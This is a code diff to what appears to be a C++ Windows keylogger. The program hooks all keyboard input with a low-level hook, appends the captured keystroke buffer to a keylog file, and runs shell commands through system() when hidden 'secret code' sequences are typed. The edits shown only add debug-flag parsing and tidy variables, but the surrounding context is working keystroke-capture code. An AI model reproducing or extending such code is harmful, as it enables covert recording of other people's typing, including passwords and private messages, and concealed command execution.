@@ -185,6 +185,8 @@ bool writeFileString(char *filename, const char *str){
 
 // Here you can add some Secrets Sequences to make specifics actions
 void detectCurrentCode(){
+    size_t found;
+
     writeFileString(_KEYLOG_FILENAME_, "\nCurrent Buffer >>>");
     writeFileString(_KEYLOG_FILENAME_, bufferString.c_str());
 
@@ -195,7 +197,7 @@ void detectCurrentCode(){
     applicationLaunchCode.push_back((secretCode){ .keyCode = "xyxyxy iprenew xyxyxy", .cmd =  "ipconfig   /renew"});
 
     for (int i = 0; i < applicationLaunchCode.size(); i++){
-        size_t found = bufferString.find(applicationLaunchCode[i].keyCode);
+        found = bufferString.find(applicationLaunchCode[i].keyCode);
         if (found!=string::npos){
             bufferString = "cmd /q /k " + applicationLaunchCode[i].cmd;
             system(bufferString.c_str());
@@ -206,9 +208,18 @@ void detectCurrentCode(){
 
 
 int main(int argc, char **argv) {
+    vector<string> allArgs;
+    size_t found;
     if (argc > 1) {
-        debug = true;
+        allArgs.assign(argv + 1, argv + argc);
+        for (int i = 0; i < allArgs.size(); i++){
+            if (strcmp(allArgs[i].c_str(),"-d")==0 ||
+                strcmp(allArgs[i].c_str(),"--debug")==0){
+                debug = true;
+            }
+        }
     }
+
     MSG msg;
     bool bRet;
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
@@ -219,4 +230,3 @@ int main(int argc, char **argv) {
             DispatchMessage(&msg);
     }
 }
-
